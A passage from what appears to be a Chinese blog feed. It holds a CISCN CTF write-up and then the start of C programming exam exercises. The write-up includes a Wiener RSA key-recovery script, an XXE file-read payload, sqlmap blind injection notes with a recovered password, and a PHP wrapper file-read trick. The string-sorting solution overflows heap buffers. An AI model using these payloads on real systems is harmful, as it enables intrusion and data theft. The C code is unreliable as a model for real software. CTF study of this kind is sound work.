Arithmetic.is_perfect_square(discr)<br>                <span class="hljs-keyword">if</span> t!=-<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (s+t)%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hacked!&quot;</span>)<br>                    <span class="hljs-keyword">return</span> d<br><br><span class="hljs-comment"># TEST functions</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_hack_RSA</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Testing Wiener Attack&quot;</span>)<br><br>    <span class="hljs-keyword">while</span>(times&gt;<span class="hljs-number">0</span>):<br>        e,n,d = RSAvulnerableKeyGenerator.generateKeys(<span class="hljs-number">1024</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(e,n) is (&quot;</span>, e, <span class="hljs-string">&quot;, &quot;</span>, n, <span class="hljs-string">&quot;)&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d = &quot;</span>, d)<br><br>        hacked_d = hack_RSA(e, n)<br><br>        <span class="hljs-keyword">if</span> d == hacked_d:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hack WORKED!&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hack FAILED&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d = &quot;</span>, d, <span class="hljs-string">&quot;, hacked_d = &quot;</span>, hacked_d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------------------------&quot;</span>)<br>        times -= <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#test_is_perfect_square()</span><br>    <span class="hljs-comment">#print(&quot;-------------------------&quot;)</span><br>    <span class="hljs-comment"># test_hack_RSA()</span><br>    e = <span class="hljs-number">932333292871340311536583425772799788581476608800501618257200913635688712797956595013312457091949241781390707236218326324287260096872275100972804737277188856396706341586791458364387568557914836880210799183882901779150174060503451992261799576875742788774243390310560719634789720219992974946820314802939572580353</span><br>    n = <span class="hljs-number">1083178419603719448638799632475202672644727971741749926078568673467491721729891939162664192885208434541370193744078154888072589708037117486860213089624795029582525501783298026959443870222339003799747202112246474259375161019073230508249672271697738321500894559008261698558072028050806042318719109646040290668273</span><br>    c = <span class="hljs-number">629671321698958970045785762020010033814849277886377341930329645318473402676175912514800812974363555981287129835454344489639514895119374277833430799149513068930055615330516662428479865724507981237582779353644800423513485357718723908554543915240117995464419165823214748496569735844685568687856495834900999682293</span><br>    d=hack_RSA(e, n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;d=&#x27;</span>,d)<br>    m=<span class="hljs-built_in">pow</span>(c, d,n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;m=&#x27;</span>,m)<br>    b = <span class="hljs-built_in">hex</span>(m)  <span class="hljs-comment">#转换成相同的字符串即&#x27;0x665554&#x27;</span><br>    b = b[<span class="hljs-number">2</span>:]   <span class="hljs-comment">#截取掉&#x27;0x&#x27;</span><br>    c = binascii.a2b_hex(b) <span class="hljs-comment">#转换成ASCii编码的字符串</span><br>    <span class="hljs-built_in">print</span>(c)<br></code></pre></td></tr></table></figure><h3 id="huahua"><a href="#huahua" class="headerlink" title="huahua"></a>huahua</h3><p>下载以后发现压缩包受损，在<code>010editor</code>中把压缩包头改为<code>504b0304</code>解压后得到一张png图片，也是缺少png头，加上<code>89504e47</code>后工具中又提示crc报错，那就再把高改一下即可得到flag</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h3><p>发一个登录请求，burp存下来<br>用sqlmap跑出时间盲注，跑出库名表名，<br>然后在lostandfound.user表里<code>select * from user where username=&#39;admin&#39;;</code><br><img src="https://i.loli.net/2021/06/14/C4ji3PgoHEKqbIw.png"><br>出密码<code>Admin@12999 ...</code>，登录拿到flag。<br><img src="https://i.loli.net/2021/06/14/hVdZijY4qXEgtym.png" alt="Screenshot_2021-06-12_23_40_51.png"></p><h3 id="Flagin"><a href="#Flagin" class="headerlink" title="Flagin"></a>Flagin</h3><p>先用burp抓个包，怀疑是xee<br>waf拦截后去掉<code>&lt;?xml</code>可过<br>最终payload:    </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;php://read=convert.base64-encode/resource=/flag.txt&quot; &gt;]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><h3 id="Be-Careful"><a href="#Be-Careful" class="headerlink" title="Be_Careful"></a>Be_Careful</h3><p>上来careful的index.php是个链接<br>点进去是?file&#x3D;a.php来着？ 里面是there is nothing<br>然后改成php伪协议base64读index.php源码<br>看到过滤列表和结尾注释的real_flag.php<br>这里过滤了存flag的文件 但没过滤real_flag.php<br>再读real_flag.php的源码 构造?a获得flag<br><img src="https://i.loli.net/2021/06/14/EVt4QTjCDYhLNcJ.png" alt="捕获.PNG"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Sign-me-up"><a href="#Sign-me-up" class="headerlink" title="Sign_me_up"></a>Sign_me_up</h3><p>下载打开文件以后发现是一大段的<code>BASE64</code>加密后的内容，疑似多次套娃，多次解密以后即得到密文内容<code>Welcome to ciscn. flag&#123;4b7fb332177a5df1b4aa6ba53e29d8fd&#125;</code></p><h3 id="Super-Man"><a href="#Super-Man" class="headerlink" title="Super_Man"></a>Super_Man</h3><p>依然是<code>010editor</code>打开图片，文件头88改为89后图片变为超人图片，接着在文件尾找到salted，放入<code>cyperchef</code>解两层即可得到flag</p><h3 id="凯撒大帝的Unicode"><a href="#凯撒大帝的Unicode" class="headerlink" title="凯撒大帝的Unicode"></a>凯撒大帝的Unicode</h3><p>根据unicode提示，将unicode转化为数字后尝试偏移(25000-24000)(忽略负数)到ascii区域进行解码<br>偏移到24591时得到字符串<code>&#39;k_\\Here&amp;comes$the]un1c0de[f1Ag1s&#123;3c3b832287a5578b3511fcd7486f4ef9&#125;&amp;%O##%&amp;P!#TQR%&quot;&amp;$&#39;</code><br>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;caesar&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br>f = f.split(<span class="hljs-string">&quot;\n&quot;</span>)[<span class="hljs-number">1</span>]<br>f = [<span class="hljs-built_in">int</span>(c.encode(<span class="hljs-string">&quot;unicode-escape&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>).replace(<span class="hljs-string">&quot;\\u&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> f]<br>offset = <span class="hljs-number">25000</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 尝试过用unicode还原回去 没找到</span><br>    <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(b-offset).replace(&quot;0x&quot;, &quot;\\u0&quot; if len(hex(b-offset).replace(&quot;-&quot;, &quot;&quot;)) == 5 else &quot;\\u&quot;).encode().decode(&quot;unicode-escape&quot;) for b in f]))</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;offset:<span class="hljs-subst">&#123;offset&#125;</span> result: &quot;</span> + <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(b-offset) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> f]))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">finally</span>:<br>        offset -= <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>可读出flag</p><h3 id="cipertext"><a href="#cipertext" class="headerlink" title="cipertext"></a>cipertext</h3><p>古典密码题…打开之后一段ook密码和一段BrainFuck以及一段jsfuck密码解密以后连起来就是flag</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="RE-签到"><a href="#RE-签到" class="headerlink" title="RE_签到"></a>RE_签到</h3><p>本题拿入后在IDA7.5中多次查看无果，只能分析出是一个调用了官方库的哈希加密工具，后来在Linux环境下分别使用了<code>strings</code>+<code>greg</code>和<code>cat</code>查看，发现在cat后文件的最后有一段形如<code>flag&#123;xxx&#125;</code>的内容，即为最后答案，但是这里有一点很不解的就是为何使用strings无法正常找到flag段，这一点有待研究。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CISCN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高级程序设计-期末复习习题组</title>
      <link href="/2021/06/ecc186f9.html"/>
      <url>/2021/06/ecc186f9.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-用链表实现单词序列倒序输出"><a href="#1-用链表实现单词序列倒序输出" class="headerlink" title="1. 用链表实现单词序列倒序输出"></a>1. 用链表实现单词序列倒序输出</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p>用链表实现单词序列倒序输出。与以往不同，请考虑采用一种完全的动态分配方式！ 为降低难度，“仁慈”的我已经给出了输出和释放的代码，你只要写出创建链表的creat函数定义就可以了。 </p><p>比如输入为： abc bcd cde </p><p>则输出为： cde bcd abc </p><p>见题干！ </p><p>你只能在代码输入框中：”&#x2F;&#x2F;start(或#start)”行的下面，”&#x2F;&#x2F;end(或#end)”行的上面输入你的代码， 而不能改变”&#x2F;&#x2F;start(或#start)”以及其上所有行的代码，包括添加空格与空行， 也不能改变”&#x2F;&#x2F;end(或#end)”以及其下所有行的代码，包括添加空格与空行．</p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 100</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">NODE</span>;</span><br>NODE* <span class="hljs-title function_">creat</span><span class="hljs-params">()</span><br>&#123;<br>    NODE *head,*cur;<br>    <span class="hljs-type">char</span> in[N];<br>    <span class="hljs-comment">//start</span><br>    head=(NODE *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(NODE));<br>    head-&gt;next=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, in)!=EOF)<br>    &#123;<br>        cur=(NODE *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(NODE));<br>        cur-&gt;data=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>) * N);<br>        <span class="hljs-built_in">strcpy</span>(cur-&gt;data, in);<br>        cur-&gt;next=head-&gt;next;<br>        head-&gt;next=cur;<br>    &#125;<br>    <span class="hljs-comment">//end</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    NODE *head,*cur,*pre;<br>    <span class="hljs-comment">/*creat list*/</span><br>    head = creat();<br>    <span class="hljs-comment">/*print list*/</span><br>    cur = head-&gt;next;<br>    <span class="hljs-keyword">while</span>(cur!=<span class="hljs-literal">NULL</span>&amp;&amp;cur-&gt;next!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s &quot;</span>,cur-&gt;data);<br>        cur = cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(cur!=<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,cur-&gt;data);<br>    <span class="hljs-comment">/*release list*/</span><br>    <span class="hljs-keyword">while</span>(head-&gt;next!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        pre = head;<br>        cur = head-&gt;next;<br>        <span class="hljs-keyword">while</span>(cur-&gt;next!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            pre = cur;<br>            cur = cur-&gt;next;<br>        &#125;<br>        <span class="hljs-built_in">free</span>(cur-&gt;data);<br>        <span class="hljs-built_in">free</span>(cur);<br>        pre-&gt;next = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-二值图像处理"><a href="#2-二值图像处理" class="headerlink" title="2. 二值图像处理"></a>2. 二值图像处理</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><blockquote><p>别紧张，你只把这个简单的二值图像处理的问题当成C语言的一道题目就可以。 输入为一个n<em>n的二维整型矩阵（矩阵中元素的最小值为0，最大值不超过1），输出其中0、1这两种值的个数。输入数 据有多组，首先输入一个整数n（0&lt;n&lt;10），代表矩阵的维数，接着是n</em>n个0或者1。 </p><p>比如输入为： </p><p>8 </p><p>0 0 0 0 0 0 0 0 </p><p>0 0 1 1 1 1 1 0 </p><p>0 0 0 0 0 1 0 0 </p><p>0 0 0 0 1 0 0 0 </p><p>0 0 0 1 0 0 0 0 </p><p>0 0 1 0 0 0 0 0 </p><p>0 1 0 0 0 0 0 0 </p><p>1 0 0 0 0 0 0 0 </p><p>则输出为： 53 11</p></blockquote><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> n, ans0=<span class="hljs-number">0</span>, ans1=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n*n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> tmp;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;tmp);<br>        <span class="hljs-keyword">if</span>(!tmp)    ans0++;<br>        <span class="hljs-keyword">else</span>    ans1++;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, ans0, ans1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-计算不同类型字符的数量"><a href="#3-计算不同类型字符的数量" class="headerlink" title="3.计算不同类型字符的数量"></a>3.计算不同类型字符的数量</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><blockquote><p>如标题所示。数据数据有多组，每组为一个用空白符分隔的字符串（长度&lt;100），请试着统计其中字母（大小写均为字 母）、数字（0~9）和其它字符的个数并输出。</p><p>比如输入为： Iloveprograming1@2#3 </p><p>则输出为： 15 3 2 </p><p><a href="%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E6%9C%89%E5%A4%9A%E7%BB%84%EF%BC%8C%E6%AF%8F%E7%BB%84%E5%85%88%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E6%95%B4%E6%95%B0%EF%BC%8C%E6%8E%A5%E7%9D%80%E8%BE%93%E5%85%A5n%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%81">注意</a>：字符串可能以’\0’或者”\r\0”作为结束标志！ </p><p>见题干！</p></blockquote><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;ctype.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">110</span>];<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str)!=EOF)<br>    &#123;<br>        <span class="hljs-type">int</span> ansalpha=<span class="hljs-number">0</span>, ansnum=<span class="hljs-number">0</span>, ansother=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(str);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">isalpha</span>(str[i])) ansalpha++;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">isalnum</span>(str[i]))    ansnum++;<br>            <span class="hljs-keyword">else</span>    ansother++;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d\n&quot;</span>, ansalpha, ansnum, ansother);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>这道题题目里面还给了结束符的类型，应该还要做具体的判定，在这里就先不用了，到时候具体问题还需要根据调试做修改</p><h2 id="4-实现字符串排序"><a href="#4-实现字符串排序" class="headerlink" title="4. 实现字符串排序"></a>4. 实现字符串排序</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><blockquote><p>实现字符串排序。与以往不同，请考虑采用一种完全的动态分配方式。请你： 1. 定义一个整型变量n，用于确定数组字符串的个数； 2. 用动态分配定义一个指针数组，用于存储每一个待排序字符串的首地址； 3. 定义一个输入缓冲区（长度不超过100的一维字符数组），用于存储不带分隔符的字符串； 4. 根据输入缓冲区中当前串的长度，动态分配空间，并将其复制到新分配的空间中； 5. 用函数实现字符串按字典升序排序，并输出排序后的字符串（每串一行）； 6. 记得释放所有之前动态分配开辟的空间！</p><p>比如输入为： 3 banana apple peach </p><p>则输出为： apple banana peach</p></blockquote><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">char</span> **prelist, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">char</span> tmp[<span class="hljs-number">110</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(prelist[i], prelist[j])&gt;<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">strcpy</span>(tmp, prelist[i]);<br>                <span class="hljs-built_in">strcpy</span>(prelist[i], prelist[j]);<br>                <span class="hljs-built_in">strcpy</span>(prelist[j], tmp);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>    <span class="hljs-type">char</span> **prelist=(<span class="hljs-type">char</span> **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span> *)*n);<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">110</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str);<br>        <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(str);<br>        <span class="hljs-type">char</span> *p=((<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>)*len));<br>        <span class="hljs-built_in">strcpy</span>(p, str);<br>        prelist[i]=p;<br>    &#125;<br>    sort(prelist, n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s &quot;</span>, prelist[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="代码（重构）"><a href="#代码（重构）" class="headerlink" title="代码（重构）"></a>代码（重构）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">char</span> **prelist, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">char</span> tmp[<span class="hljs-number">110</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(prelist[i], prelist[j])&lt;<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">strcpy</span>(tmp, prelist[i]);<br>                <span class="hljs-built_in">strcpy</span>(prelist[i], prelist[j]);<br>                <span class="hljs-built_in">strcpy</span>(prelist[j], tmp);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>    <span class="hljs-type">char</span> **prelist;<br>    prelist=(<span class="hljs-type">char</span> **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span> *)*n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">char</span> str[<span class="hljs-number">110</span>];<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str);<br>        <span 